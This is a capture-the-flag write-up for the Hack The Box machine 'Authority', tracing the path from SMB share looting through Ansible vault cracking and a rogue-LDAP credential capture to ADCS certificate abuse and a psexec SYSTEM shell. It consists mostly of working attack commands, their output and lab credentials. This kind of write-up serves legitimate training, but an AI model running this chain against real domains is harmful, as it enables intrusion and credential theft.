---
description: Parts taken from Wali's writeup
---

# Steps to PWN

{% embed url="https://www.hackthebox.com/achievement/machine/1595310/553" %}

{% embed url="https://medium.com/@Char0n_0x04/authority-htb-694f0c8bdad6" %}

### Check SMB shares

```
└─# smbclient -L \\\\10.129.87.197\\                                                             
Password for [WORKGROUP\root]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Department Shares Disk      
        Development     Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.87.197 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

### Connect to "Development" share

```
└─# smbclient \\\\10.129.87.197\\Development\\
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Mar 17 09:20:38 2023
  ..                                  D        0  Fri Mar 17 09:20:38 2023
  Automation                          D        0  Fri Mar 17 09:20:40 2023

                5888511 blocks of size 4096. 1476617 blocks available
smb: \> cd Automation
smb: \Automation\> dir
  .                                   D        0  Fri Mar 17 09:20:40 2023
  ..                                  D        0  Fri Mar 17 09:20:40 2023
  Ansible                             D        0  Fri Mar 17 09:20:50 2023

                5888511 blocks of size 4096. 1476617 blocks available
smb: \Automation\> cd Ansible
smb: \Automation\Ansible\> dir
  .                                   D        0  Fri Mar 17 09:20:50 2023
  ..                                  D        0  Fri Mar 17 09:20:50 2023
  ADCS                                D        0  Fri Mar 17 09:20:48 2023
  LDAP                                D        0  Fri Mar 17 09:20:48 2023
  PWM                                 D        0  Fri Mar 17 09:20:48 2023
  SHARE                               D        0  Fri Mar 17 09:20:48 2023

                5888511 blocks of size 4096. 1476601 blocks available
smb: \Automation\Ansible\> cd PWM
smb: \Automation\Ansible\PWM\> dir
  .                                   D        0  Fri Mar 17 09:20:48 2023
  ..                                  D        0  Fri Mar 17 09:20:48 2023
  ansible.cfg                         A      491  Thu Sep 22 01:36:58 2022
  ansible_inventory                   A      174  Wed Sep 21 18:19:32 2022
  defaults                            D        0  Fri Mar 17 09:20:48 2023
  handlers                            D        0  Fri Mar 17 09:20:48 2023
  meta                                D        0  Fri Mar 17 09:20:48 2023
  README.md                           A     1290  Thu Sep 22 01:35:58 2022
  tasks                               D        0  Fri Mar 17 09:20:48 2023
  templates                           D        0  Fri Mar 17 09:20:48 2023

                5888511 blocks of size 4096. 1476601 blocks available
smb: \Automation\Ansible\PWM\> cd defaults
smb: \Automation\Ansible\PWM\defaults\> dir
  .                                   D        0  Fri Mar 17 09:20:48 2023
  ..                                  D        0  Fri Mar 17 09:20:48 2023
  main.yml                            A     1591  Sun Apr 23 18:51:38 2023
smb: \Automation\Ansible\PWM\defaults\> get main.yml
getting file \Automation\Ansible\PWM\defaults\main.yml of size 1591 as main.yml (5.5 KiloBytes/sec) (average 5.5 KiloBytes/sec)
smb: \Automation\Ansible\PWM\defaults\> exit
```

### cat main.yml

```
└─# cat main.yml
---
pwm_run_dir: "{{ lookup('env', 'PWD') }}"

pwm_hostname: authority.htb.corp
pwm_http_port: "{{ http_port }}"
pwm_https_port: "{{ https_port }}"
pwm_https_enable: true

pwm_require_ssl: false

pwm_admin_login: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          32666534386435366537653136663731633138616264323230383566333966346662313161326239
          6134353663663462373265633832356663356239383039640a346431373431666433343434366139
          35653634376333666234613466396534343030656165396464323564373334616262613439343033
          6334326263326364380a653034313733326639323433626130343834663538326439636232306531
          3438

pwm_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          31356338343963323063373435363261323563393235633365356134616261666433393263373736
          3335616263326464633832376261306131303337653964350a363663623132353136346631396662
          38656432323830393339336231373637303535613636646561653637386634613862316638353530
          3930356637306461350a316466663037303037653761323565343338653934646533663365363035
          6531

ldap_uri: ldap://127.0.0.1/
ldap_base_dn: "DC=authority,DC=htb"
ldap_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          63303831303534303266356462373731393561313363313038376166336536666232626461653630
          3437333035366235613437373733316635313530326639330a643034623530623439616136363563
          34646237336164356438383034623462323531316333623135383134656263663266653938333334
          3238343230333633350a646664396565633037333431626163306531336336326665316430613566
          3764
```

```
// Some code
Cracked the vault password with John the ripper which is !@#$%^&*
```

Afterward, decrypt the password with tool called ansible-vault Extracting ansible passwords

<figure><img src="../.gitbook/assets/image (21).png" alt=""><figcaption><p>cracked Ansible passwords</p></figcaption></figure>

### Web Enumeration 8443:

When clicked on the configuration manager is redirects to the page that needs password only. When I entered the password pWm\_@dm!N\_!23 . It works.

<figure><img src="../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

Downloaded the configuration file on the Kali machine. It seems like web application is querying to ldaps service which happens to be unavailable.

### Intial Foothold

This can be exploit with small tweaking in the conguration file. First, setup a rogue ldap server using responder then change the authority.authority.htb in configuration file with Kali IP address and protocol to ldap so we can capture the password in clear text.

<figure><img src="../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

Now import the configuration file, go to the pwm login portal, enter any random credentials and wait. On responder ldap service credentials are display in plain text.

<figure><img src="../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

```bash
evil-winrm -i 10.129.87.197 --user svc_ldap --password 'lDaP_1n_th3_cle4r!'
```

### User flag

<figure><img src="../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

### Privilege escalation

The user svc\_ldap has extra privileges to add a work station to the active directory

<figure><img src="../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

First lets add a computer account and set its password using Impacket tool

```
─# impacket-addcomputer -dc-ip 10.129.87.197 -computer-name <malicious_PC> -computer-pass Password123 'htb.local/svc_ldap:lDaP_1n_th3_cle4r!'
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Successfully added machine account *********$ with password Password123.
```

```
└─# certipy-ad req  -username "*********$" -p "Password123" -template CorpVPN  -dc-ip 10.129.87.197 -ca AUTHORITY-CA -upn 'Administrator@authority.htb'
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 4
[*] Got certificate with UPN 'Administrator@authority.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

Its time to use technique called pass the certificate. I am using the tool called pass the cert.

The tool requires the key and crt file which can be extract from the pfx

```bash
└─# certipy-ad cert -pfx administrator.pfx -nokey -out user.crt
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Writing certificate and  to 'user.crt'

└─# certipy-ad cert -pfx administrator.pfx -nocert -out user.key
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Writing private key to 'user.key'
```

Execute the tool with modify\_user switch, it will generate random password for the administrator user. Lets do that. :)

```bash
└─# python3 passthecert.py -action modify_user -crt user.crt -key user.key -domain authority.htb -dc-ip 10.129.87.197 -target administrator -new-pass
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Successfully changed administrator password to: 7FuzjJKLfBYOJg1yPHHZhLt3q5svhimE
```

Its time to use most renown technique called pass the hack to gain shell as the administrator user

<pre class="language-bash"><code class="lang-bash">└─# impacket-psexec administrator:7FuzjJKLfBYOJg1yPHHZhLt3q5svhimE@10.129.87.197                                                         
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Requesting shares on 10.129.87.197.....
[*] Found writable share ADMIN$
[*] Uploading file AJJxDidW.exe
[*] Opening SVCManager on 10.129.87.197.....
[*] Creating service hPoh on 10.129.87.197.....
[*] Starting service hPoh.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.4644]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> cd C:\users\administrator\desktop
 
C:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is DF65-3903

 Directory of C:\Users\Administrator\Desktop

07/12/2023  01:21 PM    &#x3C;DIR>          .
07/12/2023  01:21 PM    &#x3C;DIR>          ..
10/14/2023  02:51 AM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   6,048,223,232 bytes free

C:\Users\Administrator\Desktop> type root.txt
<a data-footnote-ref href="#user-content-fn-1">a00ffac85e7b97a1fe8cc6aa5c5932fe</a>
</code></pre>

[^1]: 
